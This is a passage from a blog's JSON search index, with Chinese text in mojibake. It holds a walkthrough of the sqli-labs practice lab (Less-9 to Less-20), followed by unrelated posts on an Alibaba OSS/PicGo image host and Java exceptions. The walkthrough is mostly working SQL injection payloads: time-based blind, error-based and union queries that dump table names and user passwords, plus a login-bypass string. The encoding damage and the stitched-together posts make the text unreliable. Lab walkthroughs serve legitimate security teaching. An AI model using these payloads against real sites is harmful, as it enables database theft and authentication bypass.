exp2, exp3)ï¼šå¦‚æœexp1æ˜¯Trueï¼Œåˆ™è¿”å›exp2ï¼›å¦åˆ™è¿”å›exp3ã€‚ æ•°æ®åº“åçš„å€¼payload 12http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and if(left(database(), 8)&#x3D;&#39;security&#39;, sleep(3), 1) --+ è¡¨åçš„å€¼payload 12http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and if(left((select table_name from information_schema.tables where table_schema&#x3D;database() limit 3,1),1)&#x3D;&#39;u&#39;, sleep(3), 1) --+ å­—æ®µçš„å€¼payload 12http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and if(left((select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 1,1), 8)&#x3D;&#39;username&#39;, sleep(3), 1) --+ æ•°æ®çš„å€¼payload 12http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and if(left((select password from users order by id limit 0,1), 4)&#x3D;&#39;dumb&#39;, sleep(3), 1) --+ Less-10 åŸºäºæ—¶é—´çš„GETåŒå¼•å·ç›²æ³¨ åŸºäºæ—¶é—´çš„åŒå¼•å·ç›²æ³¨ï¼Œåªè¦æŠŠä¸Šä¸€é¢˜Less-9çš„å•å¼•å·æ”¹æˆåŒå¼•å·ï¼Œä¸€æ ·çš„æ³¨å…¥ï¼Œä¸å†èµ˜è¿°ã€‚ Less-11 åŸºäºé”™è¯¯çš„POSTå‹å•å¼•å·å­—ç¬¦å‹æ³¨å…¥ æµ‹è¯•ç™»å½•æˆåŠŸï¼Œæœ‰æ•°æ®åº“çš„æ•°æ®å›æ˜¾ä¿¡æ¯ï¼Œé‚£ä¹ˆå°±å¯ä»¥å°è¯•ä½¿ç”¨è”åˆæŸ¥è¯¢æ³¨å…¥ï¼š å†ä½¿ç”¨admin'åˆ¤æ–­æ³¨å…¥ç‚¹ï¼š è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨burpsuiteæŠ“åŒ…ï¼Œå‘é€åˆ°repeateræ¨¡å—ä¿®æ”¹POSTå‚æ•°ã€‚ æ–¹æ³•ä¸€ å•å¼•å·æŠ¥é”™æ³¨å…¥ çˆ†åº“payload 12uname&#x3D;admin&#39; and extractvalue(1,concat(0x7e,(select database()))) --+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit çˆ†è¡¨payload 12uname&#x3D;admin&#39; and extractvalue(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))) --+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit çˆ†åˆ—åpayload 12uname&#x3D;admin&#39; and extractvalue(1, concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;))) --+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit çˆ†å€¼payload 12uname&#x3D;admin&#39; and extractvalue(1, concat(0x7e, (select group_concat(username, 0x3a, password) from users))) --+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit è®°å½•å€¼è·å–ä¸ªæ•°æœ‰é™ æ–¹æ³•äºŒ ä½¿ç”¨è”åˆæŸ¥è¯¢ 12uname&#x3D;0&#39; union select 1,2 --+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit æ³¨æ„unameå€¼æ˜¯é”™è¯¯çš„æ—¶å€™ï¼Œæ‰èƒ½æ­£ç¡®æ˜¾ç¤ºè”åˆæŸ¥è¯¢çš„å†…å®¹ ä¸¾ä¸€ä¸ªğŸŒ°ï¼š 12uname&#x3D;0&#39; union select 1,database() --+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit å…¶ä»–çš„payloadç±»ä¼¼ã€‚ Less-12 åŸºäºé”™è¯¯çš„POSTå‹åŒå¼•å·å­—ç¬¦å‹å˜å½¢æ³¨å…¥ æ–¹æ³•ä¸€ åŒå¼•å·æŠ¥é”™æ³¨å…¥ æŒ‰ç…§é¢˜æ„æŠŠLess-11ä¸­payloadçš„å•å¼•å·æ”¹ä¸ºåŒå¼•å·åº”è¯¥å°±èƒ½æ³¨å…¥ï¼Œä½†æ˜¯åœ¨å®é™…æ“ä½œä¸­ï¼Œå‘ç°æ— è®ºæ˜¯ç”¨--+è¿˜æ˜¯#è¿˜æ˜¯0x23éƒ½ä¸èƒ½æ³¨é‡Šæ‰åé¢çš„å†…å®¹ã€‚ æŸ¥çœ‹ä¸€ä¸‹PHPæ–‡ä»¶ï¼š 1234$uname = &#x27;&quot;&#x27;+$uname+&#x27;&quot;&#x27;;$passwd = &#x27;&quot;&#x27;+$passwd+&#x27;&quot;&#x27;;@$sql = &quot;SELECT username, password from users where username=($uname) and password=($passwd) limit 0,1&quot;; æ„é€ ä¸€ä¸ªèƒ½é—­åˆè€Œä¸”æŠ¥é”™çš„payloadï¼š 12admin&quot; and extractvalue(1, concat(0x7e, (select database()))) and &quot; æ‰€ä»¥SQLæŸ¥è¯¢è¯­å¥å°±å˜æˆäº†ï¼š 12select username, password from users where username&#x3D;&quot;admin&quot; and extractvalue(1, concat(0x7e, (select database()))) and &quot;&quot; and password&#x3D;($passwd) limit 0,1 è¿˜æ˜¯åœ¨Burpsuiteçš„repeateræ¨¡å—ä¸­ä¿®æ”¹POSTå‚æ•°ï¼š çˆ†åº“payload 12uname&#x3D;admin&quot; and extractvalue(1, concat(0x7e, (select database()))) and &quot; &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit çˆ†è¡¨payload 12uname&#x3D;admin&quot; and extractvalue(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))) and &quot; &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit çˆ†åˆ—åpayload 12uname&#x3D;admin&quot; and extractvalue(1, concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;))) and &quot; &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit çˆ†å€¼payload 12uname&#x3D;admin&quot; and extractvalue(1, concat(0x7e, (select group_concat(username, &#39;::&#39;, password) from users))) and &quot; &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit æ–¹æ³•äºŒ ä½¿ç”¨è”åˆæŸ¥è¯¢ æ ¹æ®SQLæŸ¥è¯¢è¯­å¥å¯ä»¥æ„é€ ä¸€ä¸ªè”åˆæŸ¥è¯¢æ³¨å…¥çš„payloadï¼š 12uname&#x3D;admin5&quot;) union select 1,database() --+ &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit å…¶ä»–çš„payloadæ›¿æ¢æŸ¥è¯¢è¯­å¥å³å¯ã€‚ Less-13 POSTå•å¼•å·å˜å½¢åŒæ³¨å…¥ å½“è¾“å…¥æ­£ç¡®ä¿¡æ¯æ—¶å‘ç°æ²¡æœ‰å›æ˜¾ä¿¡æ¯ï¼Œæ‰€ä»¥ä¸èƒ½ç”¨è”åˆæŸ¥è¯¢ï¼Œä½†å¯ä»¥ä½¿ç”¨æ—¶é—´ç›²æ³¨ã€‚ ä½¿ç”¨admin' and 1=1åˆ¤æ–­æ³¨å…¥ç‚¹ï¼š é€šè¿‡æŠ¥é”™ä¿¡æ¯å¯ä»¥çŸ¥é“éœ€è¦ä¸€ä¸ª)æ¥é—­åˆæŸ¥è¯¢è¯­å¥ï¼Œåœ¨å°è¯•admin') and 1=1 and ('ï¼š å¯ä»¥å‘ç°æ•°æ®åº“ä¸æŠ¥é”™ï¼ŒSQLè¯­å¥å¯ä»¥æ­£å¸¸æ‰§è¡Œã€‚ç”±æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨æŠ¥é”™æ³¨å…¥ã€‚ æ–¹æ³•ä¸€ æŠ¥é”™æ³¨å…¥ 12uname&#x3D;admin&#39;) and extractvalue(1, concat(0x7e, (select database()))) and (&#39; åœ¨concat()ä¸­æ„é€ æŸ¥è¯¢è¯­å¥ï¼Œå’Œless-12ä»¥åŠä¹‹å‰çš„æŠ¥é”™å‹æ³¨å…¥ä¸€æ ·ï¼Œä¸å†èµ˜è¿°ã€‚ æ–¹æ³•äºŒ æ—¶é—´ç›²æ³¨ 12uname&#x3D;admin&#39;) and if(left(database(),1)&#x3D;&#39;s&#39;,sleep(3),1) --+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit Less-14 POSTå•å¼•å·åŒæ³¨å…¥ å…ˆå°è¯•ä½¿ç”¨admin&quot;) and 1=1 (&quot;ï¼š é€šè¿‡æŠ¥é”™ä¿¡æ¯å¯ä»¥çœ‹å‡ºï¼Œ è¾“å…¥å†…å®¹è¢«æ”¾åˆ°åŒå¼•å·ä¸­ ï¼Œå†æ¬¡å°è¯•`admin&quot; and 1=1#ï¼š è€Œä½¿ç”¨admin&quot; and 1=2#å‘ç°ç™»å½•å¤±è´¥ã€‚ æ–¹æ³•ä¸€ æŠ¥é”™æ³¨å…¥ ä½¿ç”¨extracvalueå‡½æ•°ï¼š 12uname&#x3D;admin&quot; and extractvalue(1,concat(0x7e,(select database()))) # &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit ä½¿ç”¨floorå‡½æ•°ï¼š 12uname&#x3D; &quot; union select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))as a from information_schema.tables group by a # &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit æ–¹æ³•äºŒ æ—¶é—´ç›²æ³¨ 12uname&#x3D;admin&quot; and if(left(database(),1)&#x3D;&#39;s&#39;,sleep(3),1) --+ &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit Less-15 åŸºäºå¸ƒå°”å‹æˆ–æ—¶é—´å»¶è¿Ÿå•å¼•å·POSTå‹æ³¨å…¥ æ— è®ºæ€ä¹ˆè¾“å…¥éƒ½æ²¡æœ‰å›æ˜¾â€”&gt;æ—¶é—´å»¶è¿Ÿæ³¨å…¥ã€‚ å»¶è¿Ÿæµ‹è¯•payloadï¼š 12uname&#x3D;admin&#39; and sleep(5) --+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit é¡µé¢å»¶è¿Ÿæ˜æ˜¾ï¼Œç¡®å®šä½¿ç”¨æ—¶é—´ç›²æ³¨ï¼š 1234567891011uname&#x3D;admin&#39; and if(length(database())&#x3D;8,sleep(5),1)--+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submituname&#x3D;admin&#39; and if(left(database(),1)&#x3D;&#39;s&#39;,sleep(5),1)--+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submituname&#x3D;admin&#39; and if( left((select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1),1)&#x3D;&#39;r&#39; ,sleep(5),1)--+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit uname&#x3D;admin&#39; and if(left((select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 4,1),8)&#x3D;&#39;password&#39; ,sleep(5),1)--+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submituname&#x3D;admin&#39; and if(left((select password from users order by id limit 0,1),4)&#x3D;&#39;dumb&#39; ,sleep(5),1)--+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit uname&#x3D;admin&#39; and if(left((select username from users order by id limit 0,1),4)&#x3D;&#39;dumb&#39; ,sleep(5),1)--+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit Less-16 åŸºäºå¸ƒå°”å‹æˆ–æ—¶é—´å»¶è¿Ÿçš„åŒå¼•å·POSTå‹ç›²æ³¨ æŠŠLess-15çš„å•å¼•å·æ”¹æˆåŒå¼•å·å³å¯ã€‚ å¦å¤–è¿˜å¯ä»¥ä½¿ç”¨ ä¸‡èƒ½è´¦å·ç»•è¿‡å¯†ç éªŒè¯admin&quot;)# éªŒè¯ã€‚ Less-17 åŸºäºé”™è¯¯çš„æ›´æ–°æŸ¥è¯¢POSTæ³¨å…¥ æ— è®ºæ€ä¹ˆè¾“å…¥ä¹Ÿæ²¡æœ‰é”™è¯¯å›æ˜¾ï¼ŒæŸ¥é˜…index.phpæºç å¯ä»¥çœ‹åˆ°check_inputå‡½æ•°å¯¹å‚æ•°unameè¿›è¡Œçš„å¤„ç†ï¼Œä»”ç»†ä¸€ä¸‹è¿™ä¸ªå‡½æ•°çš„æºç ï¼š ç¬¬ä¸€æ­¥ï¼Œåªæˆªå–å‰15ä¸ªå­—ç¬¦ï¼› ç¬¬äºŒæ­¥ï¼Œé¦–å…ˆä»‹ç»get_magic_quotes_gpc()å‡½æ•°çš„ä½œç”¨ï¼š å½“magic_quotes_gpc=Onçš„æ—¶å€™ï¼Œå‡½æ•°get_magic_quotes_gpc()å°±ä¼šè¿”å›1 å½“magic_quotes_gpc=Offçš„æ—¶å€™ï¼Œå‡½æ•°get_magic_quotes_gpc()å°±ä¼šè¿”å›0 get_magic_quotes_gpc()å‡½æ•°åœ¨phpä¸­çš„ä½œç”¨æ˜¯åˆ¤æ–­è§£æç”¨æˆ·æç¤ºçš„æ•°æ®ï¼Œå¦‚åŒ…æ‹¬æœ‰ï¼špostã€getã€cookieè¿‡æ¥çš„æ•°æ®å¢åŠ è½¬ä¹‰å­—ç¬¦â€œ\\â€ï¼Œä»¥ç¡®ä¿è¿™äº›æ•°æ®ä¸ä¼šå¼•èµ·ç¨‹åºï¼Œç‰¹åˆ«æ˜¯æ•°æ®åº“è¯­å¥å› ä¸ºç‰¹æ®Šå­—ç¬¦å¼•èµ·çš„æ±¡æŸ“è€Œå‡ºç°è‡´å‘½çš„è¯¯ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨magic_quotes_gpc = Onçš„æƒ…å†µä¸‹ï¼Œå¦‚æœè¾“å…¥çš„æ•°æ®æœ‰å•å¼•å·'ã€åŒå¼•å·&quot;ã€åæ–œçº¿\\ä¸ NULLç­‰å­—ç¬¦éƒ½ä¼šè¢«åŠ ä¸Šåæ–œçº¿ã€‚ ç¬¬ä¸‰æ­¥ï¼Œstripslashes()å‡½æ•°åˆ é™¤åæ–œçº¿ï¼› ç¬¬å››æ­¥ï¼Œctype_digit()å‡½æ•° åˆ¤æ–­æ˜¯å¦æ˜¯æ•°å­—ï¼Œæ˜¯æ•°å­—å°±è¿”å›trueï¼Œå¦åˆ™è¿”å›falseï¼› ç¬¬äº”æ­¥ï¼Œ intval()æ•´å‹è½¬æ¢ã€‚ å¯¹usernameæäº†è¿™ä¹ˆå¤šèŠ±é‡Œèƒ¡å“¨çš„æ“ä½œï¼Œä½†æ˜¯passwordå­—æ®µè¿˜æ˜¯å…‰ç§ƒç§ƒçš„ï¼Œä½¿ç”¨updatexml()å‡½æ•°å¯¹passwordå­—æ®µè¿›è¡Œæ³¨å…¥ã€‚ çˆ†åº“payload 12uname&#x3D;admin&amp;passwd&#x3D;admin&#39; and updatexml(1, concat(0x7e, database(), 0x7e),1)--+ &amp;submit&#x3D;Submit çˆ†è¡¨åpayload 12uname&#x3D;admin&amp;passwd&#x3D;admin&#39; and updatexml(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e),1) --+ &amp;submit&#x3D;Submit çˆ†åˆ—åpayload 12uname&#x3D;admin&amp;passwd&#x3D;admin&#39; and updatexml(1, concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;),0x7e),1) --+ &amp;submit&#x3D;Submit çˆ†å€¼payload 12uname&#x3D;admin&amp;passwd&#x3D;admin&#39; and updatexml(1,concat(0x7e,(select group_concat(password) from users),0x7e),1) --+ &amp;submit&#x3D;Submit å‘ç°æœ‰æŠ¥é”™ï¼š 12You can&#39;t specify target table &#39;tablename&#39; for update in FROM clause è¿™æ˜¯å› ä¸ºåœ¨MySQLé‡Œï¼Œä¸èƒ½å…ˆSELECTä¸€ä¸ªè¡¨çš„è®°å½•ï¼Œåœ¨æŒ‰æ­¤æ¡ä»¶è¿›è¡Œæ›´æ–°å’Œåˆ é™¤åŒä¸€ä¸ªè¡¨çš„è®°å½•ã€‚ç½‘ä¸Šçš„è§£å†³åŠæ³•æ˜¯ï¼Œå°†SELECTå¾—åˆ°çš„ç»“æœï¼Œå†é€šè¿‡ä¸­é—´è¡¨SELECTä¸€éï¼Œå³ï¼š 12uname&#x3D;admin&amp;passwd&#x3D;admin&#39; and updatexml(1,concat(0x7e,(select password from (select group_concat(password) from users)),0x7e),1) --+ &amp;submit&#x3D;Submit ä½†æ˜¯åˆå‡ºç°äº†æ–°çš„é”™è¯¯ä¿¡æ¯ï¼š åœ¨åšå¤šè¡¨æŸ¥è¯¢ï¼Œæˆ–è€…æŸ¥è¯¢çš„æ—¶å€™äº§ç”Ÿæ–°çš„è¡¨çš„æ—¶å€™ä¼šå‡ºç°è¿™ä¸ªé”™è¯¯ï¼šEvery derived table must have its own aliasï¼ˆæ¯ä¸€ä¸ªæ´¾ç”Ÿå‡ºæ¥çš„è¡¨éƒ½å¿…é¡»æœ‰ä¸€ä¸ªè‡ªå·±çš„åˆ«åï¼‰ã€‚ æœ€ç»ˆpayloadï¼š 12uname&#x3D;admin&amp;passwd&#x3D;admin&#39; and updatexml(1,concat(0x7e,(select password from (select password from users limit 0,1) as test),0x7e),1) --+&amp;submit&#x3D;Submit Less-18 åŸºäºé”™è¯¯çš„Uagentå¤´éƒ¨å­—æ®µPOSTæ³¨å…¥ å¦‚æœç™»å½•æ­£å¸¸çš„è¯ï¼Œä¼šæ˜¾ç¤ºUserAgentå­—æ®µçš„ä¿¡æ¯ï¼š æŠ“åŒ…ä¿®æ”¹user-agentä¸ºä¸€ä¸‹payloadå°±å¯ä»¥äº†ï¼š 12&#39;and extractvalue(1,concat(0x7e,(select database()),0x7e)) and &#39; å…¶ä»–çš„payloadç±»ä¼¼ã€‚ Less-19 åŸºäºé”™è¯¯çš„Referenceå¤´éƒ¨å­—æ®µPOSTæ³¨å…¥ æœ¬é¢˜å’Œä¸Šä¸€é¢˜å¾ˆåƒï¼Œå›æ˜¾æ˜¯refererï¼ŒæŸ¥ä¸€ä¸‹phpæ–‡ä»¶å¯ä»¥å‘ç°ï¼Œinsertè¯­å¥ä¸­å‘æ•°æ®åº“æ’å…¥äº†refererï¼Œæ‰€ä»¥æ³¨å…¥ç‚¹æ”¹ä¸ºrefererï¼Œpaylaodå’Œä¸Šä¸€é¢˜å®Œå…¨ä¸€æ ·ï¼Œä¹Ÿå¯ä»¥å‚ç…§less-12ï¼Œå°†å…¶åŒå¼•å·æ”¹ä¸ºå•å¼•å·ä½œä¸ºæœ¬é¢˜payloadï¼Œä¸å†èµ˜è¿°ã€‚ Less-20 åŸºäºé”™è¯¯çš„Cookieå¤´éƒ¨å­—æ®µPOSTæ³¨å…¥ ç™»å½•æˆåŠŸåçš„é¡µé¢ï¼š å†æŸ¥çœ‹ä¸€ä¸‹PHPæ–‡ä»¶ï¼š ç”¨BurpsuiteæŠ“åŒ…æ”¹å‚æ•°ï¼š å‘ç°æœ‰æ•°æ®åº“é”™è¯¯å›æ˜¾ï¼Œæ„é€ payloadï¼š å¦å¤–è¿˜å¯ä»¥ä½¿ç”¨è”åˆæŸ¥è¯¢ï¼Œé¦–å…ˆåˆ¤æ–­åˆ—æ•°ï¼š å†æ¥æ„é€ ä¸€ä¸ªæ ·ä¾‹payloadï¼š","tags":[{"name":"sqlæ³¨å…¥","slug":"sqlæ³¨å…¥","permalink":"http://ca0y1h.top/tags/sql%E6%B3%A8%E5%85%A5/"}],"categories":[{"name":"webå®‰å…¨","slug":"webå®‰å…¨","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/"},{"name":"åŸºç¡€å­¦ä¹ ","slug":"webå®‰å…¨/åŸºç¡€å­¦ä¹ ","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"é˜¿é‡Œäº‘OSS+PicGoæ­å»ºMarkdownå›¾åºŠ","date":"2019-10-18T14:23:29.000Z","path":"Other/2.é˜¿é‡Œäº‘OSS-PicGoæ­å»ºMarkdownå›¾åºŠ/","text":"é˜¿é‡Œäº‘OSS+PicGoæ­å»ºMarkdownå›¾åºŠ ç”¨ä¸€ä¸ªå›¾åºŠå´©ä¸€ä¸ªï¼Œå®åœ¨æ˜¯ä¸èƒ½å¿äº†ï¼Œä¸€æ€’ä¹‹ä¸‹å†³å®šç”¨é˜¿é‡Œäº‘OSSæ¥æ­å»ºä¸€ä¸ªå›¾åºŠï¼Œç¨³å®šåˆæ–¹ä¾¿~ æ­¥éª¤ï¼š è´­ä¹°é˜¿é‡Œäº‘OSSï¼Œ40Gå­˜å‚¨ç©ºé—´9å…ƒ/å¹´ï¼ˆæµé‡è´¹ç”¨å¦ç®—ï¼‰ åˆ›å»ºOSSä¸“ç”¨ç”¨æˆ·ï¼Œä¸“é—¨ç”¨äºè®¿é—®OSSï¼Œæ³¨æ„ä¿å­˜AccessKeyå’ŒAccessKeySecret ä¸‹è½½é˜¿é‡Œå®˜æ–¹çš„OSS Browserç®¡ç†å®¢æˆ·ç«¯ï¼Œå¹¶é…ç½®è¿æ¥ä¿¡æ¯ åˆ›å»ºBucketï¼Œæ³¨æ„æƒé™è®¾ç½®ä¸ºå…¬å…±è¯» åœ¨GitHubä¸‹è½½PicGoå®¢æˆ·ç«¯å¹¶å®‰è£…é…ç½® è´­ä¹°é˜¿é‡Œäº‘OSS ä»·æ ¼ï¼š 40G 9å…ƒ/å¹´ 100G 99å…ƒ/å¹´ 500G 486å…ƒ/å¹´ 1T 999å…ƒ/å¹´ åˆ°é˜¿é‡Œäº‘å®˜ç½‘æ‰¾OSSå…¥å£å³å¯ï¼š https://www.aliyun.com/product/oss?spm=5176.12825654.h2v3icoap.36.7b652c4aagSnXx&amp;aly_as=7HZ6xxr8 åˆ›å»ºä¸“ç”¨ç”¨æˆ·ï¼ˆå¯é€‰ï¼‰ è¿›å…¥æ§åˆ¶å°åï¼Œé¼ æ ‡æ‚¬æµ®åœ¨å³ä¸Šè§’çš„ç”¨æˆ·å¤´åƒï¼Œé€‰æ‹©è®¿é—®æ§åˆ¶ ç„¶ååœ¨å·¦ä¾§ï¼šäººå‘˜ç®¡ç†-&gt;ç”¨æˆ·ï¼šæ–°å»ºç”¨æˆ· è¾“å…¥ç™»å½•åç§°å’Œæ˜¾ç¤ºåç§°ï¼Œç‚¹å‡»ç¡®è®¤æŒ‰é’®ï¼Œè¦æ±‚æ‰‹æœºéªŒè¯ç ã€‚ åˆ›å»ºæˆåŠŸåï¼Œç‚¹å‡»è¿”å›ï¼Œç„¶åå›åˆ°ç”¨æˆ·åˆ—è¡¨ã€‚ ç‚¹å‡»è¿›å…¥åˆšåˆšåˆ›å»ºçš„ç”¨æˆ·ï¼Œé€‰æ‹©æƒé™ç®¡ç†ï¼Œç‚¹å‡»æ·»åŠ æƒé™ï¼Œæœç´¢AliyunOSSFullAccessï¼Œæ·»åŠ ï¼Œç¡®è®¤ã€‚ é€‰æ‹©è®¤è¯ç®¡ç†ï¼Œç‚¹å‡»æœ€ä¸‹é¢çš„åˆ›å»ºæ–°çš„AccessKeyï¼Œä¼šç”ŸæˆAccessKeyIDå’ŒAccessKeySecretï¼ŒAccessKeySecretæ˜¯æ— æ³•æ‰¾å›çš„ï¼Œæ‰€ä»¥ä¸€å®šè¦ä¿å­˜å¥½ã€‚ åˆ›å»ºBucket è¿›å…¥OSSæ§åˆ¶å°ï¼šhttps://oss.console.aliyun.com/overview ç‚¹å‡»åŠ å·ï¼Œåˆ›å»ºBucketã€‚ æ³¨æ„ï¼š Bucketåç§°è¦å…¨å±€å”¯ä¸€ åŒºåŸŸæœ€å¥½é€‰æ‹©ç¦»ä½ è¿‘çš„ æƒé™é€‰æ‹©å…¬å…±è¯»ï¼Œè¿™æ ·å­å›¾ç‰‡åˆ«äººæ‰èƒ½è®¿é—®å¾—åˆ° å®‰è£…OSS Browserå®¢æˆ·ç«¯ OSS Browseræ˜¯é˜¿é‡Œäº‘å®˜æ–¹çš„å®¢æˆ·ç«¯å·¥å…·ï¼Œå¯ä»¥ä½¿ç”¨æ‹¥æœ‰OSSæƒé™çš„ç”¨æˆ·ç™»å½•ï¼Œä»è€Œå…å»ç™»å½•å®˜ç½‘æ§åˆ¶å°çš„éº»çƒ¦ã€‚ OSS Browser Windows64ä¸‹è½½åœ°å€ï¼š http://gosspublic.alicdn.com/oss-browser/1.9.4/oss-browser-win32-x64.zip OSSå¸¸ç”¨å·¥å…·æ±‡æ€»ï¼š https://help.aliyun.com/document_detail/44075.html å®‰è£…å®Œæˆä¹‹åï¼Œè¾“å…¥AccessKeyã€AccessKeySecretç™»å½•å³å¯ï¼Œå…¶ä»–éƒ½æ˜¯å¯é€‰é¡¹ã€‚ å¯ä»¥æ–°å»ºBucketã€ä¸Šä¼ æ–‡ä»¶ã€ä¸Šä¼ æ–‡ä»¶å¤¹ç­‰ç­‰ã€‚ å®‰è£…PicGo PicGoæ˜¯ä¸€ä¸ªæ”¯æŒå¤šç§å›¾åºŠçš„å®¢æˆ·ç«¯å›¾ç‰‡ä¸Šä¼ å·¥å…·ï¼Œå¯ä»¥å®ç°å¿«é€Ÿä¸Šä¼ å›¾ç‰‡åˆ°æŒ‡å®šå›¾åºŠï¼Œå¹¶å°†é“¾æ¥ä¿å­˜åˆ°å‰ªè´´æ¿ã€‚ GitHubåœ°å€ï¼š https://github.com/Molunerfinn/PicGo Releaseåœ°å€ï¼š https://github.com/Molunerfinn/PicGo/releases Windowsçš„ä¸‹è½½picgo-setup-2.1.2.exeä¸‹è½½å®‰è£…å³å¯ è®¾ç½®å‚è€ƒå›¾ç‰‡å³å¯ï¼š è¿™é‡Œæœ€å‘çš„åœ°æ–¹å°±åœ¨äºç¡®å®šå­˜å‚¨åŒºåŸŸè¿™ä¸€é¡¹ï¼Œå¹¶ä¸æ˜¯OSSæ§åˆ¶å°ä¸­çš„Endpointå¤–ç½‘è®¿é—®çš„å…¨éƒ¨åœ°å€ï¼Œè€Œæ˜¯.aliyuncs.comå‰é¢çš„å€¼ï¼ï¼ï¼ è®¾å®šè‡ªå®šä¹‰åŸŸååï¼Œç”Ÿæˆçš„é“¾æ¥ä¼šè‡ªåŠ¨ç”¨è‡ªå®šä¹‰çš„åŸŸåæ›¿æ¢ã€‚ å½“ä½¿ç”¨æˆªå›¾å·¥å…·æˆªå›¾åï¼Œä¼šä¿å­˜åˆ°å‰ªè´´æ¿ï¼Œè¿™æ—¶æŒ‰ä¸‹å¿«æ·é”®ï¼ŒPicGoå°±ä¼šè‡ªåŠ¨ä¸Šä¼ å›¾ç‰‡ï¼Œç„¶åå°†æŒ‡å®šæ ¼å¼çš„é“¾æ¥åœ°å€æ”¾åˆ°å‰ªè´´æ¿ï¼Œç›´æ¥ç²˜è´´åˆ°Markdownæ–‡æ¡£å³å¯ã€‚ ç‚¹å‡»å³ä¸Šè§’çš„â•ï¼Œä¼šå˜æˆæµ®çª—ï¼Œå°†å›¾ç‰‡ç›´æ¥æ‹–åˆ°æµ®çª—å°±èƒ½ä¸Šä¼ ã€‚","tags":[{"name":"OSS","slug":"OSS","permalink":"http://ca0y1h.top/tags/OSS/"}],"categories":[{"name":"æŠ€æœ¯éšç¬”","slug":"æŠ€æœ¯éšç¬”","permalink":"http://ca0y1h.top/categories/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/"}]},{"title":"JavaåŸºç¡€å­¦ä¹ ä¹‹å¼‚å¸¸å¤„ç†","date":"2019-10-14T08:21:15.000Z","path":"Java/code/4.JavaåŸºç¡€å­¦ä¹ ä¹‹å¼‚å¸¸å¤„ç†/","text":"JavaåŸºç¡€å­¦ä¹ ä¹‹å¼‚å¸¸å¤„ç† Javaçš„å¼‚å¸¸ Javaæ ‡å‡†åº“ä¸­å¸¸ç”¨çš„å¼‚å¸¸ï¼š å¼‚å¸¸æ˜¯ä¸€ç§classï¼Œå®ƒçš„ç»§æ‰¿å…³ç³»å¦‚ä¸‹ï¼š Throwableæœ‰ä¸¤ä¸ªå­ç±»ï¼šErrorå’ŒExceptionã€‚ Errorè¡¨ç¤ºä¸¥é‡çš„é”™è¯¯ï¼Œä¾‹å¦‚ï¼š OutOfMemoryErrorï¼šå†…å­˜è€—å°½ NoClassDefFountErrorï¼šæ— æ³•åŠ è½½æŸä¸ªClass StackOverflowErrorï¼šæ ˆæº¢å‡º Exceptionè¡¨ç¤ºè¿è¡Œæ—¶é”™è¯¯ï¼Œå®ƒå¯ä»¥è¢«æ•è·å¹¶å¤„ç†ã€‚ ç¨‹åºé€»è¾‘å¤„ç†ç›¸å…³ï¼š NumberFormatExceptionï¼šæ•°å€¼ç±»å‹çš„æ ¼å¼é”™è¯¯ FileNotFoundExceptionï¼šæœªæ‰¾åˆ°æ–‡ä»¶ SocketExceptionï¼šè¯»å–ç½‘ç»œå¤±è´¥ ä»¥åŠç¨‹åºé€»è¾‘ç¼–å†™é”™è¯¯ï¼š NullPointerExceptionï¼šå¯¹æŸä¸ªnullçš„å¯¹è±¡è°ƒç”¨æ–¹æ³•æˆ–å­—æ®µ IndexOutOfBoundsExceptionï¼šæ•°ç»„ç´¢å¼•è¶Šç•Œ Javaè§„å®šï¼š å¿…é¡»æ•è·çš„å¼‚å¸¸åŒ…æ‹¬ï¼šExceptionåŠå…¶å­ç±»ï¼Œé™¤äº†RuntimeExcetionåŠå…¶å­ç±»ã€‚ ä¸éœ€è¦æ•è·çš„å¼‚å¸¸åŒ…æ‹¬ï¼šErroråŠå…¶å­ç±»ï¼ŒRuntimeExcetionåŠå…¶å­ç±»ã€‚ æ•è·å¼‚å¸¸ 